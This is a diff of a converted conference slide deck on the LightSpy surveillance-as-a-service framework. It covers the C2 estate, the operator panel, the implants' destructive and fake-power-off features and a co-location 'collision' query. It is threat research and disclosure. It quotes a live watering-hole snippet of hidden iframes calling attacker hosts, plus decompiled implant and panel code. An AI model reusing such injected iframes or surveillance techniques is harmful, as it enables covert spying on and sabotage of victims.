@@ -14,6 +14,8 @@ has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 85.8
 ocr_unreliable_blocks: 0
+vision_verified_pages_changed: 56
+vision_verified_pages: 57
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
 companion_files: []
@@ -41,61 +43,68 @@ converted_at: "2026-08-12T05:32:35Z"
 
 ###### The Story Behind LightSpy (aka androidSync)
 
-**Malicious iframe + N-day exploits Trojanized applications** Telegram, Baidu
+**Malicious iframe + N-day exploits**
+
+**Trojanized applications** Telegram, Baidu
 
 **Watering-hole example:** hxxps://www[.]ncforum[.]org[.]hk/news/120
 
-_(This image is taken from the watering hole site)_
+```text
+<br />
+<iframe src="https://www.facebooktoday.cc/pic.php?id=ncforum_login" width=0 height=0 style="display:none"></iframe>
+<iframe src="https://www.messager.cloud/963852741/hh1212/index.html" width=0 height=0 style="display:none"></iframe></div>
+    </div>
+```
 
-2
+_(This image is taken from the watering hole site)_
 
 ## Slide 3
 
-###### WHY WE’RE HERE
+###### WHY WE'RE HERE
 
-**THE STORY I N THREE SENT ENCES**
+**THE STORY IN THREE SENTENCES**
 
 ###### **WHAT IT IS**
 
-**An actively maintained surveillance** **framework - 70+ plugins across iOS, Android, iPad, Windows, macOS, Linux and routers -** **licensed as -a-** **service , with a demo tier and a billing flag baked into the console.**
+**An actively maintained surveillance framework - 70+ plugins across iOS, Android, iPad, Windows, macOS, Linux and routers - licensed as-a-service, with a demo tier and a billing flag baked into the console.**
 
 ###### **WHY IT MATTERS**
 
-**Discovered in 2020 against Hong Kong protest sites. Six years later:** **117 servers, 35 brand-spoofing domains , live router implants in Europe and Africa, and a** **destructive capability that turns collection into sabotage.**
+**Discovered in 2020 against Hong Kong protest sites. Six years later: 117 servers, 35 brand-spoofing domains, live router implants in Europe and Africa, and a destructive capability that turns collection into sabotage.**
 
-###### **WHY WE’RE TALKING**
+###### **WHY WE'RE TALKING**
 
-**We decompiled the live operator panel - and the developers left a lunch order in it. That** **single receipt gives us the office , the company, and the person who typed the code.**
+**We decompiled the live operator panel - and the developers left a lunch order in it. That single receipt gives us the office, the company, and the person who typed the code.**
 
 **One live platform. One contractor. One careless order of fried chicken!**
 
 **Five sections in forty minutes: the hunt, the panel, the routers, the people, the defense.**
 
-3
-
 ## Slide 4
 
 ###### EXECUTIVE SUMMARY
 
-## 70+ 117
+## 70+
 
-###### **Surveillance**
-
-###### **Servers Mapped**
-
-###### **Plugins**
-
-One known C2 expanded by SSL-certificate pivoting into a 117-host estate across 39 networks and 19 countries
+###### **Surveillance Plugins**
 
 Across 7 target classes: iOS, iPad, Android, macOS, Windows, Linux, routers
 
-## 144 2
+## 117
+
+###### **Servers Mapped**
+
+One known C2 expanded by SSL-certificate pivoting into a 117-host estate across 39 networks and 19 countries
+
+## 144
 
 ###### **Implant Commands**
 
-###### **Identified Infected Routers**
-
 The panel's own /cmd_list catalog - 55 of them have no button anywhere in the operator UI
+
+## 2
+
+###### **Identified Infected Routers**
 
 MikroTik devices in South Africa and the Czech Republic, both beaconing to Istanbul
 
@@ -103,91 +112,159 @@ MikroTik devices in South Africa and the Czech Republic, both beaconing to Istan
 
 LightSpy is not a single-operator APT tool. It is a productized surveillance platform with a demo tier, a billing flag and white-label customer brands — built by a small Chinese contractor whose own developer ordered a meal through the panel he was testing.
 
-4
-
 ## Slide 5
 
 ###### FRAMEWORK ARCHITECTURE AT A GLANCE
 
-5
+**LightSpy operator panel**
 
+**Router**
+- Basic hardware info
+- Change credentials
+- Rewrite LAN IP
+- Rewrite WAN IP
+- Change WAN gateway
+- Rewrite DNS + DNS
+- Read attached USB.
 
-> Recovered by OCR — confidence 80/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+**Android**
+- Telegram
+- QQ Messenger
+- WeChat
+- WeChat Pay
+- Enigma Messenger
+- Instagram
+- Facebook
+- AliPay
+- Geolocation
+- Wi-Fi List
+- Camera
+- Files
+- System
+- Software List
+- Line Messenger
+- Phone Call Records
 
-```text
-FRAMEWORK ARCHITECTURE AT A GLANCE
-Router
-Basic hardware info
-Change credentials
-Rewrite LAN IP
-Rewrite WAN IP
-Change WAN gateway
-Rewrite DNS + DNS
-Read attached USB.
-=] Get Basic Hardware Information
-ary Get System Information
-Linux
-=] UploadLog
-=] Get Linux Information
-am Windows DeepData
-© Skype = Software List
-@ Telegram = MS Outlook
-®@ Signal & KeePass
-& QQ Messenger mi Email
-® FeShu Platform ® Web Browser
-Ww. VXWorks Wi-Fi List
-®& DingDang Platform ® Baiddu Disk and OneDrive
-L ® WeChat & Audio Record A
-Android
-@ Telegram 9 Geolocation
-LBs ss QQ Messenger & Wi-Fi List
-& WeChat © Camera
-om ® WeChat Pay i Files
-® Enigma Messenger % System
-@ Instagram = Software List
-® Facebook ®& Line Messenger
-B AliPay
-\ Phone Call Records
-MacOS
-© Audio Record
-® Browsers
-©) Screenshots
-®& ScreenVideo
-iOS
-@ Telegram 9 Geolocation ©& Email
-@ WhatsApp © Camera 8 Screenshots
-% QQMessenger i Files @ Soft List
-$@ WeChat © Audio Record =
-® System *> Delete Media
-@ Web Browser i Files
-& KeyChain ® SMS
-& KeyChain
-© Camera
-& Wi-Fi List
-E) Shell Command
-black hat
-2626 5
-```
+**Linux**
+- UploadLog
+- Get Basic Hardware Information
+- Get System Information
+- Get Linux Information
+
+**iOS**
+- Telegram
+- WhatsApp
+- QQ Messenger
+- WeChat
+- Phone Call Records
+- System
+- Web Browser
+- KeyChain
+- Geolocation
+- Camera
+- Files
+- Audio Record
+- DeleteSpring
+- Delete Media
+- Files
+- SMS
+- Email
+- Screenshots
+- Soft List
+- BootDestroy
+- Email
+
+**Windows DeepData**
+- Skype
+- Telegram
+- Signal
+- QQ Messenger
+- FeShu Platform
+- VXWorks
+- DingDang Platform
+- WeChat
+- Software List
+- MS Outlook
+- KeePass
+- Email
+- Web Browser
+- Wi-Fi List
+- Baiddu Disk and OneDrive
+- Audio Record
+
+**MacOS**
+- Audio Record
+- Browsers
+- Screenshots
+- ScreenVideo
+- Files
+- KeyChain
+- LanDevices
+- Camera
+- Wi-Fi List
+- Shell Command
 
 ## Slide 6
 
 ###### NEW IOS & ANDROID PLUGINS
 
-**LightCore iOS 2020-21 LightCore iOS 2024** `MinimumOSVersion → MinimumOSVersion →` 11.0 11.0 VS SDK iOS 14.3 SDK iOS 15.0 Signature: <Chinese Signature: <Chinese name 1> name 2> (VG6JHJ2J8L) (8D47DBXA2J) 2 926 928 bytes 2 929 312 bytes
+**LightCore iOS 2020-21**
+`MinimumOSVersion →` 11.0
+SDK iOS 14.3
+Signature: <Chinese name 1> (VG6JHJ2J8L)
+2 926 928 bytes
+
+VS
+
+**LightCore iOS 2024**
+`MinimumOSVersion →` 11.0
+SDK iOS 15.0
+Signature: <Chinese name 2> (8D47DBXA2J)
+2 929 312 bytes
 
 **LightCore Android 2025** Same functionality. **Removed Chinese text strings.**
 
-6
+**LightCore Android 6.5.24 (2022-2023)**
+
+```text
+(IsWorkingInSameApp(mJarFilePath)) {
+  UploadLog.sendLog(TransportControlCommand.CMD_FRAME_LOG, "睡眠取证软件编号: [" + Stri
+else {
+  MainThread.getInstance().Stop();
+  UploadLog.sendLog(TransportControlCommand.CMD_FRAME_LOG, "S开始启动取证软件编号: [" +
+  UploadLog.sendLog(TransportControlCommand.CMD_FRAME_LOG, "[进程 = " + mProcessName +
+  mIsLoad = MainThread.getInstance().Start2(mContext, mJarFilePath, console_ip_port, p
+```
+
+**LightCore Android 6.6.1 (2026)**
+
+```text
+(!a(str)) {
+  j.p().c();
+  b.f.a(n.f131a, "S:Start the Forensics Software Number: [" + m + "][" + Thread.currentThread().getId()
+  b.f.a(n.f131a, "[ProcessName = " + k + "]");
+  c = j.p().a(context, str, str2, str3);
+else {
+  b.f.a(n.f131a, "Sleep Forensics Software Number: [" + m + "][" + Thread.currentThread().getId() + "]"
+```
 
 ## Slide 7
 
 ###### **WHAT'S NEW SINCE 2020 · NEW 2026**
 
-**INFRASTRUCTURE &** ⬡ **ARCHITECTURE**
+**INFRASTRUCTURE & ARCHITECTURE**
 
-Servers 39 ASNs **117** 19 countries implant commands **144** from /cmd_list catalog REST endpoints **271** 56 panel chunks
+**117** Servers, 39 ASNs, 19 countries
 
-1 known C2 to full estate via SSL pivot 35 domains spoofing 4 telcos, Xiaomi, Samsung Checksums + version control = matured SDLC
+**144** implant commands from /cmd_list catalog
+
+**271** REST endpoints, 56 panel chunks
+
+1 known C2 to full estate via SSL pivot
+
+35 domains spoofing 4 telcos, Xiaomi, Samsung
+
+Checksums + version control = matured SDLC
 
 **DESTRUCTIVE & STEALTH**
 
@@ -195,7 +272,11 @@ Servers 39 ASNs **117** 19 countries implant commands **144** from /cmd_list cat
 
 Capability shift confirmed in the implant
 
-Boot-area **destroy,** process kill, telephony kill **fakePowerOff()** - records while device looks “off” **Panic-alert** path stays live under kill
+Boot-area **destroy,** process kill, telephony kill
+
+**fakePowerOff()** - records while device looks “off”
+
+**Panic-alert** path stays live under kill
 
 Operator audit log ships with **a wipe button**
 
@@ -211,19 +292,15 @@ is_test **demo tier** + bill flag = a price list
 
 Live MikroTik beacons - NATO countries in scope
 
-**Productized platform** , not a lone-operator tool
-
-7
+**Productized platform**, not a lone-operator tool
 
 ## Slide 8
 
-**S EC TI ON 1**
+**SECTION 1**
 
 ##### THE HUNT
 
 From one server to 117
-
-8
 
 ## Slide 9
 
@@ -243,33 +320,36 @@ Uploading date from version.json - proof of active development post-disclosure.
 
 ###### **Observed endpoints**
 
-hxxp://47[.]96[.]148[.]5:52202/963852741/ios/plugins/manifest[.]json hxxp://47[.]96[.]148[.]5:52202/963852741/ios/version[.]json hxxp://47[.]96[.]148[.]5:52202/963852741/mmfile/ads/plugins/manifest[.]json hxxp://47[.]96[.]148[.]5:52202/963852741/mmfile/ads/version[.]txt
-
-9
+hxxp://47[.]96[.]148[.]5:52202/963852741/ios/plugins/manifest[.]json
+hxxp://47[.]96[.]148[.]5:52202/963852741/ios/version[.]json
+hxxp://47[.]96[.]148[.]5:52202/963852741/mmfile/ads/plugins/manifest[.]json
+hxxp://47[.]96[.]148[.]5:52202/963852741/mmfile/ads/version[.]txt
 
 ## Slide 10
 
 ###### SSL CERTIFICATE FINGERPRINTING
 
-**PIVOT ING MET HO DOL OGY**
+**PIVOTING METHODOLOGY**
 
-#### 01 02
+#### 01
 
 ###### **Certificate Extraction**
 
-###### **Pattern Analysis**
-
 Extract the SSL certificate from the known C2 using openssl; analyze issuer CN patterns, serial numbers and validity periods.
+
+#### 02
+
+###### **Pattern Analysis**
 
 Identify certificates with common issuer patterns, consistent serial-number algorithms and matching certificate chains.
 
 #### 03
 
-**Infrastructure Discovery  to  117 hosts** Search for matching certificate fingerprints across internet-wide scans; validate with path-structure tests and high port.
+###### **Infrastructure Discovery to 117 hosts**
+
+Search for matching certificate fingerprints across internet-wide scans; validate with path-structure tests and high port.
 
 CERTIFICATE FINGERPRINT: **17E5CF36E50B644E27E1F5DEF8C1ED942AD462EF99CC61FCA27E37ADE8FB8F4A**
-
-10
 
 ## Slide 11
 
@@ -277,33 +357,33 @@ CERTIFICATE FINGERPRINT: **17E5CF36E50B644E27E1F5DEF8C1ED942AD462EF99CC61FCA27E3
 
 ### 39
 
-### 49
-
-23
-
 ###### **Port 52202**
-
-###### **Port 80**
-
-###### **Port 2096**
 
 Primary C2 and plugin distribution - the single most diagnostic port in the estate
 
+### 49
+
+###### **Port 80**
+
 Plugin manifest over cleartext: /963852741/…/manifest.json
+
+### 23
+
+###### **Port 2096**
 
 HTTPS plugin delivery - pairs with :80 on 21 of these hosts
 
 **Typical server configuration  20 distinct ports, 160 ip:port pairs across 117 hosts**
 
-**Port 52202   HTTP plugin distribution + C2 Port 80  +  2096   manifest / HTTPS delivery pair Port 53501   HTTPS panel login  (/ujmfanncy76211/login)**
-
-11
+Port 52202   HTTP plugin distribution + C2
+Port 80  +  2096   manifest / HTTPS delivery pair
+Port 53501   HTTPS panel login  (/ujmfanncy76211/login)
 
 ## Slide 12
 
 ###### INFRASTRUCTURE EXPANSION RESULTS
 
-**11 7 C2 SERVERS BY HOSTING GEOGRAPHY 39 ASNs 1 9 COUNTRIES**
+**117 C2 SERVERS BY HOSTING GEOGRAPHY 39 ASNs 19 COUNTRIES**
 
 China 33
 Hong Kong 27
@@ -314,31 +394,43 @@ Netherlands 5
 
 **Largest networks:  Alibaba Cloud 22, TOPWAY GLOBAL 14, Tencent 7, Chinese state telecoms 6, Huawei Cloud 3, AWS 2 and (13 further countries beyond the six shown)**
 
-12
-
 ## Slide 13
 
 ###### 2025–2026 CAMPAIGN - THE DOMAINS **NEW 2026**
 
 **35 domains on the same certificate cluster - telco and handset brand-mimicry, plus a European business register**
 
-**Brand & telco spoofs  12 turkcellphone[.]com  (Turkcell - Türkiye) etisalatphone[.]cloud  (Etisalat - UAE) phoneforjazz[.]com  (Jazz - Pakistan) roshanphone[.]cloud  (Roshan Afghanistan)**
+**Brand & telco spoofs  12**
+turkcellphone[.]com  (Turkcell - Türkiye)
+etisalatphone[.]cloud  (Etisalat - UAE)
+phoneforjazz[.]com  (Jazz - Pakistan)
+roshanphone[.]cloud  (Roshan Afghanistan)
+m[.]xiaomivideo[.]com
+s[.]xiaomishopstore[.]com
+miphone[.]space
+miphonemix[.]xyz
+samsunginfotech[.]comsamsunggadget[.]shop
+samgalax[.]xyzsamroms[.]top
 
-**m[.]xiaomivideo[.]com s[.]xiaomishopstore[.]com miphone[.]space miphonemix[.]xyz samsunginfotech[.]comsamsunggadget[.]shop samgalax[.]xyzsamroms[.]top**
-
-**Router / register / ops  23** www[.]routerconfigonline[.]com getsmscloud[.]io www[.]messager[.]cloud apis[.]chatsupport[.]work kbohandelsregister[.]25u[.]com kbohandelsregister[.]4dq[.]com kbohandelsregister[.]4pu[.]com The Belgian federal enterprise register, on free ChangeIP dynamic-DNS parents foldnova[.]xyz - registered 2026-07-07 12 of 35 registered via Gname.com (SG)
-
-13
+**Router / register / ops  23**
+www[.]routerconfigonline[.]com
+getsmscloud[.]io
+www[.]messager[.]cloud
+apis[.]chatsupport[.]work
+kbohandelsregister[.]25u[.]com
+kbohandelsregister[.]4dq[.]com
+kbohandelsregister[.]4pu[.]com
+The Belgian federal enterprise register, on free ChangeIP dynamic-DNS parents
+foldnova[.]xyz - registered 2026-07-07
+12 of 35 registered via Gname.com (SG)
 
 ## Slide 14
 
-**S EC TI ON 2**
+**SECTION 2**
 
 ##### INSIDE THE PANEL
 
 The live operator console
-
-14
 
 ## Slide 15
 
@@ -352,15 +444,17 @@ Source maps never stripped
 
 ## 271
 
-144
-
 ###### **REST endpoints**
+
+Behind 42 operator UI modules
+
+## 144
 
 ###### **Command codes**
 
-Behind 42 operator UI modules 55 of them have no UI button at all
+55 of them have no UI button at all
 
-8
+## 8
 
 ###### **OS / device classes**
 
@@ -370,115 +464,109 @@ incl. iPad and an undocumented “S13”
 
 7 login with 4 user tiers (level 1 - 3 + is_test) per-customer build flagswhite-label csm208/csm210 brands - the signature of a productized platform, not an in-house tool.
 
-15
-
 ## Slide 16
 
 ###### PANEL ACCESS DISCOVERY
 
-L IV E OP E R ATO R C O N S O LE C A P TU R E D
+LIVE OPERATOR CONSOLE CAPTURED
 
 The Vue.js operator console: device inventory, command dispatch and live status. Left rail lists implanted devices; right pane shows per-device controls.
-
-16
 
 ## Slide 17
 
 ###### PLUGIN GENERATION
 
-**O P ER ATO R B U ILD S A PAY LO A D O N D E M AN D**
+OPERATOR BUILDS A PAYLOAD ON DEMAND
 
 Generate Bin workflow: operators select implantation method, independent APIs and standing method, then compile a per-target build directly from the panel.
-
-17
 
 ## Slide 18
 
 ###### SHELL COMMAND EXECUTION
 
-###### **P LU G IN : S H E LL C O M MA N D S**
+###### **PLUGIN: SHELL COMMANDS**
 
 Interactive shell issued through the panel - arbitrary command execution on the compromised device with returned output rendered in the console.
-
-18
 
 ## Slide 19
 
 ###### VICTIM MANAGEMENT DASHBOARD
 
-**“ IM PL A N TE D P H O NE S ” STAT IS TIC S PA N E L**
+**“IMPLANTED PHONES” STATISTICS PANEL**
 
 ###### **Device-list display columns**
 
-**Device ID (UID):** unique victim identifier **Platform:** iOS 13.9, macOS 10.13.4, Android **Model:** iPhone 7 Plus, iPhone X **Phone:** +86XXXXXXXXXXX, +852XXXXXXXX **IP address:** 192.168.144.167, local network **Wi-Fi:** connected SSID (Haso_618) **Status:** online/offline with timestamp **Last seen:** Chinese timezone
+**Device ID (UID):** unique victim identifier
+**Platform:** iOS 13.9, macOS 10.13.4, Android
+**Model:** iPhone 7 Plus, iPhone X
+**Phone:** +86XXXXXXXXXXX, +852XXXXXXXX
+**IP address:** 192.168.144.167, local network
+**Wi-Fi:** connected SSID (Haso_618)
+**Status:** online/offline with timestamp
+**Last seen:** Chinese timezone
 
-**Example victim entry** User:   [REDACTED] (021) Device: iPhone  iOS 13.9 UID:    dd75c7c3fe17167f IP:     192.168.168.126 Status: 设备已上线 (Online) Wi-Fi:  Haso_618 Phone:  +852 XXXXXXXX
+**Example victim entry**
 
-19
+```text
+User:   [REDACTED] (021)
+Device: iPhone  iOS 13.9
+UID:    dd75c7c3fe17167f
+IP:     192.168.168.126
+Status: 设备已上线 (Online)
+Wi-Fi:  Haso_618
+Phone:  +852 XXXXXXXX
+```
 
 ## Slide 20
 
 ###### “RISK OF EXPOSURE IN VIDEO SURVEILLANCE”
 
-###### **THE MALWARE OPERAT ORS KNOW**
+###### **THE MALWARE OPERATORS KNOW**
 
 ###### **Camera LED might activate**
 
 ###### **Victim might notice**
 
-###### **High-risk Could expose the operation infection**
+###### **High-risk operation**
 
-20
+###### **Could expose the infection**
+
+"There is a risk of exposure in video surveillance. Are you sure to issue the surveillance order?"
 
 ## Slide 21
 
-###### fakePowerOff() - THE VICTIM THINKS IT’S OFF **2026 ESPIONAGE to DENIAL OF SAFETY**
+###### fakePowerOff() - THE VICTIM THINKS IT’S OFF **NEW 2026**
 
-**NEW**
-
-21
-
-
-> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+**ESPIONAGE to DENIAL OF SAFETY**
 
 ```text
-fakePowerOff() - THE VICTIM THINKS IT’S OFF NEW
-2026
-ESPIONAGE to DENIAL OF SAFETY
-2727
-}
-}, [e("span", {
-on: {
-click: function(t) {
-n.fakePowerOff = !0
-}
-}
-}, [n._v("“Paralyze target")])]) : n._e(), n-_v("
-attrs: {
-icon: “el-icon-error"
-}
-}, [e("span", {
-on: fil
-click: n.fakePowerOff
-}, [n._v("Pseudo shutdown")])]) : n._e(), n._v("
-attrs: {
-icon: “el-icon-delete-solid”
-}
-}, [e("span", {
-on: {
-click: function(t) {
-"), "android" === n.os ? e("el-dropdown-item", {
-"), e("el-dropdown-item", {
-black hat
-USA
-2026 21
+2715                }
+2716            }, [e("span", {
+2717                on: {
+2718                    click: function(t) {
+2719                        n.fakePowerOff = !0
+2720                    }
+2721                }
+2722            }, [n._v("Paralyze target")])]) : n._e(), n._v(" "), "android" === n.os ? e("el-dropdown-item", {
+2723                attrs: {
+2724                    icon: "el-icon-error"
+2725                }
+2726            }, [e("span", {
+2727                on: {
+2728                    click: n.fakePowerOff
+2729                }
+2730            }, [n._v("Pseudo shutdown")])]) : n._e(), n._v(" "), e("el-dropdown-item", {
+2731                attrs: {
+2732                    icon: "el-icon-delete-solid"
+2733                }
+2734            }, [e("span", {
+2735                on: {
+2736                    click: function(t) {
 ```
 
 ## Slide 22
 
-###### fakePowerOff() - THE VICTIM THINKS IT’S OFF **2026**
-
-###### **NEW**
+###### fakePowerOff() - THE VICTIM THINKS IT’S OFF **NEW 2026**
 
 **ESPIONAGE to DENIAL OF SAFETY**
 
@@ -492,63 +580,63 @@ Most spyware stops when the victim powers off. This implant pretends to power of
 
 ###### **fakePowerOff - descriptive**
 
-show_power_off_animation() blank_screen(black, no backlight)
-
-suppress_notification_LEDs() # device stays active
-
-keep_radio + mic + location on forward_panic_button to operator_alert
+```text
+show_power_off_animation()
+blank_screen(black, no backlight)
+suppress_notification_LEDs()
+# device stays active
+keep_radio + mic + location on
+forward_panic_button to operator_alert
+```
 
 ###### **The panic-alert twist**
 
-When the victim tries an emergency call `from the “off” state` - the operator is notified instead of the call connecting.
+When the victim tries an emergency call from the “off” state - the operator is notified instead of the call connecting.
 
 Operator can suppress the call or fake an emergency screen.
-
-22
 
 ## Slide 23
 
 ###### SELF-DESTRUCTION & ANTI-FORENSICS
 
-**DESTRUCTION IS A CHECKBOX DIALOG, NOT AN EXOT IC CAPABI LI TY**
-
-23
-
-
-> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+**DESTRUCTION IS A CHECKBOX DIALOG, NOT AN EXOTIC CAPABILITY**
 
 ```text
-SELF-DESTRUCTION & ANTI-FORENSICS
-DESTRUCTION IS A CHECKBOX DIALOG, NOT AN EXOTIC CAPABILITY
-private static boolean IsWorkingInSameApp mJarFilePath
-boolean bRet;
-_lock.lock();
-try
-try
-catch e
-LogUtil.e(TAG,
-bRet = true;
-mIsLoad
-throw new
-CheckExist
-throw new
-bRet = false;
-return bRet;
-finally
-_lock.unlock();
-public static boolean IsExistSameAppRequest
-strAppName ;
-int pid;
-black hat
-USA
-2026 23
+        return bRet;
+    }
+
+    private static boolean IsWorkingInSameApp(String mJarFilePath) {
+        boolean bRet;
+        _lock.lock();
+        try {
+            try {
+            } catch (Exception e) {
+                LogUtil.e(TAG, "IsWorkingInSameApp", e);
+                bRet = true;
+            }
+            if (mIsLoad) {
+                throw new Exception("Forensics software already exists.");
+            }
+            if (CheckExist()) {
+                throw new Exception("Forensics software is working.");
+            }
+            bRet = false;
+            return bRet;
+        } finally {
+            _lock.unlock();
+        }
+    }
+
+    public static boolean IsExistSameAppRequest(String strMessage) {
+        String strAppName;
+        int pid;
 ```
 
 ## Slide 24
 
 ###### SELF-DESTRUCTION & ANTI-FORENSICS
 
-**DESTRUCTION IS A CHECKBOX DIALOG, NOT AN EXOT IC CAPABI LI TY**
+**DESTRUCTION IS A CHECKBOX DIALOG, NOT AN EXOTIC CAPABILITY**
 
 ###### **Device sabotage**
 
@@ -566,11 +654,9 @@ Contacts. Photos and video. Saved Wi-Fi passwords. SMS. Per-data-class, so the o
 
 ###### **Evidence wipe on the server**
 
-**/system/clear_supervisor/sys tem/clear_web**
+**/system/clear_supervisor/system/clear_web**
 
 Plus per-row deletion in the operator's own log viewer. The consequence for incident response: if you seize one of these panels, its audit log is not a forensic record. It is whatever the operator last decided to leave in it.
-
-24
 
 ## Slide 25
 
@@ -578,35 +664,49 @@ Plus per-row deletion in the operator's own log viewer. The consequence for inci
 
 Additional New Findings
 
-###### 01 **时空碰撞 TIME-SPACE COLLISION**
+###### 01
 
-A retroactive physicalmeeting detector that runs across the whole victim fleet at once.
+**时空碰撞**
+**TIME-SPACE COLLISION**
 
-02 **mtype S13 - THE EIGHTH CLASS**
-
-Not an OS. A hardwareprofile flag the backend assigns, and the menu obeys it before iOS.
-
-###### 03
-
-###### **/router/* THE GATEWAY CONSOLE**
-
-Seven tabs, its own REST tree, its own login page and its own 41xxx command namespace.
-
-04
-
-###### **D:\project\ A SECOND BUILD MACHINE**
-
-Webpack never stripped the source maps, so every bundle names the workstation.
+A retroactive physical-meeting detector that runs across the whole victim fleet at once.
 
 One endpoint. Four verbs. radius 50 m, window 60 min.
 
-S13Mod = androidMod radius 50 m, window 60 plus one min. module nobody else gets. **/collision keylogger**
+`/collision`
 
-One GET returns every Wi-Fi password in the building. **infect type S7**
+###### 02
 
-A different drive, a different root, a different repo name. **azyk**
+`mtype`
+**S13 - THE EIGHTH CLASS**
 
-25
+Not an OS. A hardware-profile flag the backend assigns, and the menu obeys it before iOS.
+
+S13Mod = androidMod plus one module nobody else gets.
+
+`keylogger`
+
+###### 03
+
+`/router/*`
+**THE GATEWAY CONSOLE**
+
+Seven tabs, its own REST tree, its own login page and its own 41xxx command namespace.
+
+One GET returns every Wi-Fi password in the building.
+
+`infect type S7`
+
+###### 04
+
+`D:\project\`
+**A SECOND BUILD MACHINE**
+
+Webpack never stripped the source maps, so every bundle names the workstation.
+
+A different drive, a different root, a different repo name.
+
+`azyk`
 
 ## Slide 26
 
@@ -614,14 +714,20 @@ A different drive, a different root, a different repo name. **azyk**
 
 CrashLocation.vue  CHUNK 8.js  ROUTE /phone/location  ONE ENDPOINT:  /collision  NEW 2026
 
-**The query, in one sentence** _Give me every compromised device that stood within R meters of this target, within T minutes of when the target was there._
+**The query, in one sentence**
 
-**01   Pick benchmark devices** -  base_uids[] The known target. The panel calls them Benchmark equipment. **02   Pick candidate devices** -  uids[]
+_Give me every compromised device that stood within R meters of this target, within T minutes of when the target was there._
 
-Anyone else in the fleet. You do not need to know who they are. **03   Set the tolerances** -  radius / minutes Default 50 meters and 60 minutes. The unit selector multiplies the window by 1, 60 or 1440 - minute, hour, day.
+**01   Pick benchmark devices** -  base_uids[]
+The known target. The panel calls them Benchmark equipment.
 
-###### **04   Read success_counts**
+**02   Pick candidate devices** -  uids[]
+Anyone else in the fleet. You do not need to know who they are.
 
+**03   Set the tolerances** -  radius / minutes
+Default 50 meters and 60 minutes. The unit selector multiplies the window by 1, 60 or 1440 - minute, hour, day.
+
+**04   Read success_counts**
 Zero hits and the detail view refuses to open: “Collision failed, no result.” Any other number is a list of meetings.
 
 _Run it with the day multiplier and a wide radius and it stops being a meeting detector - it becomes a neighborhood census of everyone the platform owns._
@@ -633,11 +739,9 @@ uid 4b1e…
 benchmark  base_uids[]
 uid dd75…
 
-**radius: 50 minutes: 60 success_counts: 3**
+**radius: 50   minutes: 60   success_counts: 3**
 
 The dashed ring is an AMap.Circle of row.radius meters around the benchmark. Every colliding device is drawn as a red marker with its address and timestamp.
-
-26
 
 ## Slide 27
 
@@ -645,11 +749,28 @@ The dashed ring is an AMap.Circle of row.radius meters around the benchmark. Eve
 
 CrashLocation.vue  name: crash_location  TOGGLED FROM mode_location.vue BY v_crash_switch()
 
+```text
 CrashLocation.vue  -  chunk 8.js  -  reconstructed from the shipped bundle
 
-// the mission object the operator fills in, serialized straight into the POST body crash = { name:      "",            // mission label - required, validated client-side radius:    50, `// meters  the UI appends the label “rice”` minutes:   60,            // window `×` 1 minute `×` 60 hour `×` 1440 day uids:      [],            // candidates  - `“Collision equipment”` base_uids: []             // benchmarks  - `“Benchmark equipment”` }
+// the mission object the operator fills in, serialized straight into the POST body
+crash = {
+    name:       "",             // mission label - required, validated client-side
+    radius:     50,             // meters  the UI appends the label “rice”
+    minutes:    60,             // window  ×1 minute  ×60 hour  ×1440 day
+    uids:       [],             // candidates  - “Collision equipment”
+    base_uids: []               // benchmarks  - “Benchmark equipment”
+}
 
-// four verbs, one REST surface POST  /collision    params = JSON.stringify(crash) `→ data[] of hits` GET /collision    cmd:"list"    start / end / uid `→` success_counts GET /collision    cmd:"detail"  uid + task_id `→` lng / lat / address POST  /collision    cmd:"delete" | "delete_all" `→ the mission is gone` // what comes back per hit row { base_device_name, collision_devices[], success_counts, radius, minutes, create_user_name, create_time, devices[]: [ { lng, lat, address, time } ] }
+// four verbs, one REST surface
+POST  /collision      params = JSON.stringify(crash)        → data[] of hits
+GET   /collision      cmd:"list"     start / end / uid      → success_counts
+GET   /collision      cmd:"detail"  uid + task_id           → lng / lat / address
+POST  /collision      cmd:"delete" | "delete_all"           → the mission is gone
+
+// what comes back per hit row
+{ base_device_name, collision_devices[], success_counts, radius, minutes,
+  create_user_name, create_time, devices[]: [ { lng, lat, address, time } ] }
+```
 
 ###### **WHY IT IS NOT JUST GPS**
 
@@ -663,8 +784,6 @@ Point-in-time location says where one person was. Collision says who else was th
 
 Nothing. The location data is already harvested from every victim. Collision is a query over data already in hand.
 
-27
-
 ## Slide 28
 
 ###### S13  -  THE EIGHTH DEVICE CLASS
@@ -673,7 +792,7 @@ NOT AN OPERATING SYSTEM. A FLAG:  x_phone_info.mtype === 'S13'  MENU OVERRIDE IN
 
 v_is_show()  -  THE ORDER DECIDES THE MENU
 1      linux / unknown →    linuxMod
-2     mtype === 'S13' →    S13Mod
+2      mtype === 'S13' →    S13Mod
 3      os === ios →    iosMod
 4      os === ipad →    ipadArr
 5      os === router →    routerMod
@@ -685,13 +804,19 @@ v_is_show()  -  THE ORDER DECIDES THE MENU
 
 ###### **S13Mod  =  androidMod** ∪ **{ keylogger }**
 
-Phoneinfo, location, contacts, chat, files, camera, audio, app, wifi, shell, command, keylogger Twelve tabs. No browser, no intranet, no iOS keychain - so it is not an iPhone menu. But it carries the one module stock Android never gets.
+Phoneinfo, location, contacts, chat, files, camera, audio, app, wifi, shell, command, keylogger
 
-**WHAT THE FLAG ACTUALLY BUYS** 58 **commands reachable** =  Android's 57  +  43003 An S13 device reporting client_os: “android” never sees androidMod. One reporting “ios” never sees the fifteen -tab iosMod. The flag wins.
+Twelve tabs. No browser, no intranet, no iOS keychain - so it is not an iPhone menu. But it carries the one module stock Android never gets.
 
-And the split is sloppy: navigation reads mtype, but most component v-if gates still read client_os. An S13 device with client_os: “ios” gets the S13 menu and the iOS-only phoneinfo actions at the same time. **No S13 infect type. No /s13/* API. No builder tab.**
+**WHAT THE FLAG ACTUALLY BUYS**
 
-28
+58 **commands reachable** =  Android's 57  +  43003
+
+An S13 device reporting client_os: “android” never sees androidMod. One reporting “ios” never sees the fifteen-tab iosMod. The flag wins.
+
+And the split is sloppy: navigation reads mtype, but most component v-if gates still read client_os. An S13 device with client_os: “ios” gets the S13 menu and the iOS-only phoneinfo actions at the same time.
+
+**No S13 infect type. No /s13/* API. No builder tab.**
 
 ## Slide 29
 
